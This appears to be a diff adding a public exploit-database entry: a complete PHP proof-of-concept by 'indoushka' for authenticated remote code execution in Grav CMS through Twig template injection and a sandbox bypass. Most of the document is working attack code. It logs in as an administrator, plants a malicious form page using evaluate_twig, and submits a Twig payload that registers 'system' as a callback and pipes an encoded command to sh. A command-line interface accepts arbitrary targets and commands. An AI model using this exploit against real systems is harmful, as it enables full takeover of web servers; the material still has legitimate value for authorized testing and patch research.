@@ -1,0 +1,661 @@
+=============================================================================================================================================
+| # Title     : Grav CMS 1.7.49.5 Sandbox Bypass                                                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://getgrav.org/                                                                                                        |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212777/ & CVE-2025-66294, CVE-2025-66301
+
+[+] Summary    : This code is a standalone PHP Proof of Concept (PoC) exploit targeting Grav CMS that demonstrates 
+                 an authenticated Remote Code Execution (RCE) vulnerability caused by a Twig Server-Side Template Injection (SSTI) combined with a sandbox bypass.
+                 The exploit requires valid administrative credentials. After authentication, it abuses the Grav Admin Pages feature to create a malicious form page. 
+				 The form’s processing logic leverages the dangerous evaluate_twig functionality, allowing user-supplied input to be interpreted as Twig code. 
+				 By chaining this with internal Twig methods, the exploit disables sandbox restrictions and registers system-level function callbacks.
+                 Once the malicious form is published, the attacker can trigger code execution from the frontend without further access to the admin panel. 
+				 The payload execution mechanism supports arbitrary command execution on the underlying operating system (primarily Unix/Linux in this PoC), without relying on file uploads, direct eval, or persistent shell access.
+                 Overall, this exploit represents an operational-grade authenticated RCE scenario, highlighting how misconfigured or unsafe template evaluation 
+				 in CMS platforms can lead to full system compromise. It is suitable for authorized security testing, red team simulations, and defensive research, and clearly illustrates the risks of dynamic template evaluation in web applications.
+				 
+[+] POC : php poc.php
+
+<?php
+
+class GravCMSExploit
+{
+    private $baseUrl;
+    private $username;
+    private $password;
+    private $formName;
+    private $timeout;
+    private $verifySSL;
+    
+    private $cookies = [];
+    private $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
+    
+    private $formFolder;
+    private $formNameVar;
+    private $adminNonce;
+    private $formNonce;
+    private $uniqueFormId;
+    private $frontendNonce;
+    private $frontendUniqueId;
+    private $frontendFormName;
+    
+    public function __construct($options = [])
+    {
+        $this->baseUrl = rtrim($options['target'] ?? 'http://localhost:80', '/');
+        $this->username = $options['username'] ?? 'admin';
+        $this->password = $options['password'] ?? 'admin';
+        $this->formName = $options['form_name'] ?? 'form-' . $this->randomText(8);
+        $this->timeout = $options['timeout'] ?? 30;
+        $this->verifySSL = $options['verify_ssl'] ?? false;
+    }
+    
+    public static function randomText($length)
+    {
+        $characters = 'abcdefghijklmnopqrstuvwxyz';
+        $result = '';
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $characters[rand(0, strlen($characters) - 1)];
+        }
+        return $result;
+    }
+    
+    private function httpRequest($method, $url, $data = null, $headers = [])
+    {
+        $fullUrl = $this->baseUrl . $url;
+        
+        $ch = curl_init();
+        
+        curl_setopt($ch, CURLOPT_URL, $fullUrl);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
+        curl_setopt($ch, CURLOPT_USERAGENT, $this->userAgent);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, $this->verifySSL);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, $this->verifySSL ? 2 : 0);
+        
+        // Handle cookies
+        if (!empty($this->cookies)) {
+            $cookieString = '';
+            foreach ($this->cookies as $name => $value) {
+                $cookieString .= $name . '=' . $value . '; ';
+            }
+            curl_setopt($ch, CURLOPT_COOKIE, rtrim($cookieString, '; '));
+        }
+        
+        // Save cookies
+        curl_setopt($ch, CURLOPT_HEADERFUNCTION, [$this, 'handleResponseHeaders']);
+        
+        // Set method and data
+        if ($method === 'POST') {
+            curl_setopt($ch, CURLOPT_POST, true);
+            if ($data) {
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+            }
+        } elseif ($method === 'GET') {
+            curl_setopt($ch, CURLOPT_HTTPGET, true);
+        }
+        
+        // Add custom headers
+        if (!empty($headers)) {
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        }
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $error = curl_error($ch);
+        
+        curl_close($ch);
+        
+        if ($error) {
+            throw new Exception("cURL error: " . $error);
+        }
+        
+        return [
+            'code' => $httpCode,
+            'body' => $response,
+            'headers' => $this->lastHeaders
+        ];
+    }
+    
+    private function handleResponseHeaders($ch, $header)
+    {
+        if (preg_match('/^Set-Cookie:\s*([^=]+)=([^;]+)/i', $header, $matches)) {
+            $this->cookies[$matches[1]] = $matches[2];
+        }
+        
+        $this->lastHeaders[] = $header;
+        
+        return strlen($header);
+    }
+    
+    private function extractValue($html, $pattern, $default = null)
+    {
+        if (preg_match($pattern, $html, $matches)) {
+            return html_entity_decode($matches[1], ENT_QUOTES | ENT_HTML5);
+        }
+        return $default;
+    }
+    
+    public function check()
+    {
+        echo "[*] Checking target {$this->baseUrl}...\n";
+        
+        try {
+            $response = $this->httpRequest('GET', '/admin');
+            
+            $html = $response['body'];
+            
+            // Check if it's Grav CMS
+            if (strpos($html, 'data-grav') !== false || 
+                strpos($html, 'grav-version') !== false ||
+                strpos($html, 'Grav CMS') !== false ||
+                strpos($html, '/user/plugins/admin/') !== false) {
+                
+                echo "[+] Target appears to be Grav CMS\n";
+                
+                // Try to extract version
+                if (preg_match('/grav-version[^>]*>([^<]+)</', $html, $matches)) {
+                    $version = trim($matches[1]);
+                    echo "[+] Detected Grav CMS version: {$version}\n";
+                    
+                    // Check if vulnerable (pre 1.8.0.beta.27)
+                    $cleanVersion = preg_replace('/[^\d\.]/', '', $version);
+                    if (version_compare($cleanVersion, '1.8.0', '<')) {
+                        echo "[+] Target is likely VULNERABLE!\n";
+                        return true;
+                    } else {
+                        echo "[+] Version check inconclusive - trying exploit anyway\n";
+                        return true;
+                    }
+                } else {
+                    echo "[+] Could not detect version - trying exploit anyway\n";
+                    return true;
+                }
+                
+            } else {
+                echo "[-] Target doesn't appear to be Grav CMS\n";
+                return false;
+            }
+            
+        } catch (Exception $e) {
+            echo "[-] Error checking target: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    public function exploit($command = 'id')
+    {
+        echo "\n[*] Starting exploit...\n";
+        
+        $this->formFolder = $this->formName;
+        $this->formNameVar = 'exploit-' . strtolower(self::randomText(8));
+        
+        echo "[*] Using form folder: {$this->formFolder}\n";
+        echo "[*] Using form name: {$this->formNameVar}\n";
+        
+        try {
+            if (!$this->login()) {
+                echo "[-] Login failed\n";
+                return false;
+            }
+            
+            if (!$this->fetchAdminNonce()) {
+                echo "[-] Failed to fetch admin nonce\n";
+                return false;
+            }
+            
+            if (!$this->createFormPage()) {
+                echo "[-] Failed to create form page\n";
+                return false;
+            }
+            
+            if (!$this->saveFormWithPayload()) {
+                echo "[-] Failed to save form with payload\n";
+                return false;
+            }
+            
+            if (!$this->fetchFrontendNonces()) {
+                echo "[-] Failed to fetch frontend nonces\n";
+                return false;
+            }
+            
+            $result = $this->executePayload($command);
+            
+            if ($result !== false) {
+                echo "\n[+] Exploit completed successfully!\n";
+                echo "[+] Command output:\n{$result}\n";
+                return true;
+            } else {
+                echo "[-] Payload execution failed\n";
+                return false;
+            }
+            
+        } catch (Exception $e) {
+            echo "[-] Error during exploit: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function login()
+    {
+        echo "\n[*] Authenticating as {$this->username}...\n";
+        
+        try {
+            // First get the login page to extract nonce
+            $response = $this->httpRequest('GET', '/admin');
+            $html = $response['body'];
+            
+            // Extract login nonce
+            $loginNonce = $this->extractValue($html, '/name="login-nonce" value="([^"]+)"/');
+            
+            if (!$loginNonce) {
+                // Check if already logged in
+                if (strpos($html, 'grav-version') !== false || 
+                    strpos($html, 'Dashboard') !== false) {
+                    echo "[+] Already authenticated\n";
+                    return true;
+                }
+                
+                echo "[-] Could not find login nonce\n";
+                return false;
+            }
+            
+            echo "[+] Extracted login nonce: {$loginNonce}\n";
+            
+            // Attempt login
+            $postData = http_build_query([
+                'data[username]' => $this->username,
+                'data[password]' => $this->password,
+                'task' => 'login',
+                'login-nonce' => $loginNonce
+            ]);
+            
+            $response = $this->httpRequest('POST', '/admin', $postData, [
+                'Content-Type: application/x-www-form-urlencoded'
+            ]);
+            
+            // Check if login was successful
+            $html = $response['body'];
+            
+            if (strpos($html, 'grav-version') !== false || 
+                strpos($html, 'Dashboard') !== false ||
+                $response['code'] == 302 ||
+                $response['code'] == 303) {
+                echo "[+] Login successful\n";
+                return true;
+            } else {
+                echo "[-] Login failed - check credentials\n";
+                return false;
+            }
+            
+        } catch (Exception $e) {
+            echo "[-] Login error: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function fetchAdminNonce()
+    {
+        echo "\n[*] Fetching admin nonce...\n";
+        
+        try {
+            $response = $this->httpRequest('GET', '/admin/pages');
+            $html = $response['body'];
+            
+            $this->adminNonce = $this->extractValue($html, '/name="admin-nonce" value="([^"]+)"/');
+            
+            if (!$this->adminNonce) {
+                echo "[-] Could not find admin nonce\n";
+                return false;
+            }
+            
+            echo "[+] Admin nonce: {$this->adminNonce}\n";
+            return true;
+            
+        } catch (Exception $e) {
+            echo "[-] Error fetching admin nonce: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function createFormPage()
+    {
+        echo "\n[*] Creating malicious form page...\n";
+        
+        try {
+            $postData = http_build_query([
+                'data[title]' => 'Contact Form',
+                'data[folder]' => $this->formFolder,
+                'data[route]' => '',
+                'data[name]' => 'form',
+                'data[visible]' => '',
+                'data[blueprint]' => '',
+                'task' => 'continue',
+                'admin-nonce' => $this->adminNonce
+            ]);
+            
+            $response = $this->httpRequest('POST', '/admin/pages', $postData, [
+                'Content-Type: application/x-www-form-urlencoded'
+            ]);
+            
+            $html = $response['body'];
+            
+            // Extract form nonces
+            $this->formNonce = $this->extractValue($html, '/name="form-nonce" value="([^"]+)"/');
+            $this->uniqueFormId = $this->extractValue($html, '/name="__unique_form_id__" value="([^"]+)"/');
+            
+            if (!$this->formNonce || !$this->uniqueFormId) {
+                echo "[-] Could not extract form nonces\n";
+                return false;
+            }
+            
+            echo "[+] Form nonce: {$this->formNonce}\n";
+            echo "[+] Unique form ID: {$this->uniqueFormId}\n";
+            
+            return true;
+            
+        } catch (Exception $e) {
+            echo "[-] Error creating form page: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function saveFormWithPayload()
+    {
+        echo "\n[*] Saving form with payload...\n";
+        
+        try {
+            $formPayload = $this->formPayloadJson();
+            
+            $postData = http_build_query([
+                'task' => 'save',
+                'data[header][title]' => 'Contact Form',
+                'data[content]' => 'Please submit the form',
+                'data[folder]' => $this->formFolder,
+                'data[route]' => '',
+                'data[name]' => 'form',
+                'data[_json][header][form]' => $formPayload,
+                '_post_entries_save' => 'edit',
+                '__form-name__' => 'flex-pages',
+                '__unique_form_id__' => $this->uniqueFormId,
+                'form-nonce' => $this->formNonce
+            ]);
+            
+            $response = $this->httpRequest('POST', "/admin/pages/{$this->formFolder}/:add", $postData, [
+                'Content-Type: application/x-www-form-urlencoded'
+            ]);
+            
+            echo "[+] Form saved successfully (HTTP {$response['code']})\n";
+            echo "[+] Form payload: " . substr($formPayload, 0, 100) . "...\n";
+            
+            return in_array($response['code'], [200, 302, 303]);
+            
+        } catch (Exception $e) {
+            echo "[-] Error saving form: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function formPayloadJson()
+    {
+        $payload = [
+            'name' => $this->formNameVar,
+            'fields' => [
+                'name' => [
+                    'type' => 'text',
+                    'label' => 'Name',
+                    'required' => true
+                ]
+            ],
+            'buttons' => [
+                'submit' => [
+                    'type' => 'submit',
+                    'value' => 'Submit'
+                ]
+            ],
+            'process' => [
+                [
+                    'message' => "{{ evaluate_twig(form.value('name')) }}"
+                ]
+            ]
+        ];
+        
+        return json_encode($payload);
+    }
+    
+    private function fetchFrontendNonces()
+    {
+        echo "\n[*] Fetching frontend nonces...\n";
+        
+        try {
+            $response = $this->httpRequest('GET', "/{$this->formFolder}");
+            $html = $response['body'];
+            
+            $this->frontendNonce = $this->extractValue($html, '/name="form-nonce" value="([^"]+)"/');
+            $this->frontendUniqueId = $this->extractValue($html, '/name="__unique_form_id__" value="([^"]+)"/');
+            $this->frontendFormName = $this->extractValue($html, '/name="__form-name__" value="([^"]+)"/', $this->formNameVar);
+            
+            if (!$this->frontendNonce || !$this->frontendUniqueId) {
+                echo "[-] Could not extract frontend nonces\n";
+                return false;
+            }
+            
+            echo "[+] Frontend nonce: {$this->frontendNonce}\n";
+            echo "[+] Frontend unique ID: {$this->frontendUniqueId}\n";
+            echo "[+] Frontend form name: {$this->frontendFormName}\n";
+            
+            return true;
+            
+        } catch (Exception $e) {
+            echo "[-] Error fetching frontend nonces: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function executePayload($command)
+    {
+        echo "\n[*] Triggering payload execution...\n";
+        
+        try {
+            $twigPayload = $this->generateTwigPayload($command);
+            echo "[+] Twig payload generated\n";
+            echo "[+] Executing command: {$command}\n";
+            
+            $postData = http_build_query([
+                'data[name]' => $twigPayload,
+                '__form-name__' => $this->frontendFormName,
+                '__unique_form_id__' => $this->frontendUniqueId,
+                'form-nonce' => $this->frontendNonce
+            ]);
+            
+            $response = $this->httpRequest('POST', "/{$this->formFolder}", $postData, [
+                'Content-Type: application/x-www-form-urlencoded'
+            ]);
+            
+            $html = $response['body'];
+            
+            // Try to extract the result from the response
+            // Look for notice messages or form responses
+            $patterns = [
+                '/<div[^>]*class="[^"]*notices[^"]*"[^>]*>(.*?)<\/div>/si',
+                '/<p[^>]*class="[^"]*notice[^"]*"[^>]*>(.*?)<\/p>/si',
+                '/<div[^>]*class="[^"]*alert[^"]*"[^>]*>(.*?)<\/div>/si',
+                '/<div[^>]*class="[^"]*form-message[^"]*"[^>]*>(.*?)<\/div>/si'
+            ];
+            
+            foreach ($patterns as $pattern) {
+                if (preg_match($pattern, $html, $matches)) {
+                    $result = strip_tags($matches[1]);
+                    $result = preg_replace('/\s+/', ' ', $result);
+                    $result = trim($result);
+                    if (!empty($result)) {
+                        return $result;
+                    }
+                }
+            }
+            
+            // If no pattern matched, try to find any output
+            if (strlen($html) < 5000) { // Don't show huge pages
+                return "No clear output found. Response HTML (first 2000 chars):\n" . 
+                       substr($html, 0, 2000);
+            }
+            
+            return "Command likely executed. Check server response manually.";
+            
+        } catch (Exception $e) {
+            echo "[-] Error executing payload: " . $e->getMessage() . "\n";
+            return false;
+        }
+    }
+    
+    private function generateTwigPayload($command)
+    {
+        // For Unix/Linux targets
+        $compressed = gzdeflate($command, 9);
+        $encodedCmd = base64_encode($compressed);
+        $encodedCmd = str_replace(["\r", "\n"], '', $encodedCmd);
+        
+        // Twig payload that bypasses sandbox
+        $payload = "{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}" .
+                  "{% set a = grav.config.set('system.twig.undefined_functions',false) %}" .
+                  "{{ grav.twig.twig.getFunction('php -r \"echo gzinflate(base64_decode('" . 
+                  $encodedCmd . "'));\" | sh') }}";
+        
+        return $payload;
+    }
+}
+
+// CLI Interface - No external dependencies
+if (php_sapi_name() === 'cli') {
+    echo "========================================\n";
+    echo "Grav CMS SSTI Exploit POC\n";
+    echo "by indoushka\n";
+    echo "========================================\n";
+    echo "Requirements: PHP with cURL extension\n\n";
+    
+    // Check for cURL
+    if (!function_exists('curl_init')) {
+        echo "ERROR: cURL extension is not enabled in PHP!\n";
+        echo "Enable it in php.ini or install it.\n";
+        exit(1);
+    }
+    
+    $options = [];
+    $command = 'id';
+    
+    // Parse command line arguments
+    if ($argc > 1) {
+        for ($i = 1; $i < $argc; $i++) {
+            if ($argv[$i] === '--target' && isset($argv[$i+1])) {
+                $options['target'] = $argv[++$i];
+            } elseif ($argv[$i] === '--username' && isset($argv[$i+1])) {
+                $options['username'] = $argv[++$i];
+            } elseif ($argv[$i] === '--password' && isset($argv[$i+1])) {
+                $options['password'] = $argv[++$i];
+            } elseif ($argv[$i] === '--command' && isset($argv[$i+1])) {
+                $command = $argv[++$i];
+            } elseif ($argv[$i] === '--form-name' && isset($argv[$i+1])) {
+                $options['form_name'] = $argv[++$i];
+            } elseif (in_array($argv[$i], ['-h', '--help'])) {
+                echo "Usage: php poc.php [options]\n";
+                echo "Options:\n";
+                echo "  --target URL     Target URL (default: http://localhost:80)\n";
+                echo "  --username USER  Grav CMS username (default: admin)\n";
+                echo "  --password PASS  Grav CMS password (default: admin)\n";
+                echo "  --form-name NAME Form folder name (default: random)\n";
+                echo "  --command CMD    Command to execute (default: id)\n";
+                echo "  -h, --help       Show this help message\n\n";
+                echo "Examples:\n";
+                echo "  php poc.php --target http://grav.local --username admin --password admin123\n";
+                echo "  php poc.php --target https://example.com --command \"whoami && pwd\"\n";
+                exit(0);
+            }
+        }
+    }
+    
+    // Interactive mode if no arguments
+    $interactive = ($argc == 1);
+    
+    if ($interactive) {
+        echo "Interactive mode - press Enter for defaults\n";
+        echo "========================================\n\n";
+    }
+    
+    // Get target
+    if (empty($options['target'])) {
+        if ($interactive) {
+            echo "Enter target URL [http://localhost:80]: ";
+            $input = trim(fgets(STDIN));
+            $options['target'] = $input ?: 'http://localhost:80';
+        } else {
+            $options['target'] = 'http://localhost:80';
+        }
+    }
+    
+    // Get credentials
+    if (empty($options['username'])) {
+        if ($interactive) {
+            echo "Enter username [admin]: ";
+            $input = trim(fgets(STDIN));
+            $options['username'] = $input ?: 'admin';
+        } else {
+            $options['username'] = 'admin';
+        }
+    }
+    
+    if (empty($options['password'])) {
+        if ($interactive) {
+            echo "Enter password [admin]: ";
+            $input = trim(fgets(STDIN));
+            $options['password'] = $input ?: 'admin';
+        } else {
+            $options['password'] = 'admin';
+        }
+    }
+    
+    if (empty($command) && $interactive) {
+        echo "Enter command to execute [id]: ";
+        $input = trim(fgets(STDIN));
+        $command = $input ?: 'id';
+    }
+    
+    echo "\n";
+    
+    // Create exploit instance
+    $exploit = new GravCMSExploit($options);
+    
+    // Run check
+    echo "Configuration:\n";
+    echo "  Target:   {$options['target']}\n";
+    echo "  Username: {$options['username']}\n";
+    echo "  Command:  {$command}\n\n";
+    
+    if (!$exploit->check()) {
+        echo "\n[-] Target check failed. Continue anyway? [y/N]: ";
+        if ($interactive) {
+            $input = strtolower(trim(fgets(STDIN)));
+        } else {
+            $input = 'y';
+        }
+        
+        if ($input !== 'y' && $input !== 'yes') {
+            exit(1);
+        }
+    }
+    
+    // Run exploit
+    $success = $exploit->exploit($command);
+    
+    if (!$success) {
+        echo "\n[-] Exploit failed\n";
+        exit(1);
+    }
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
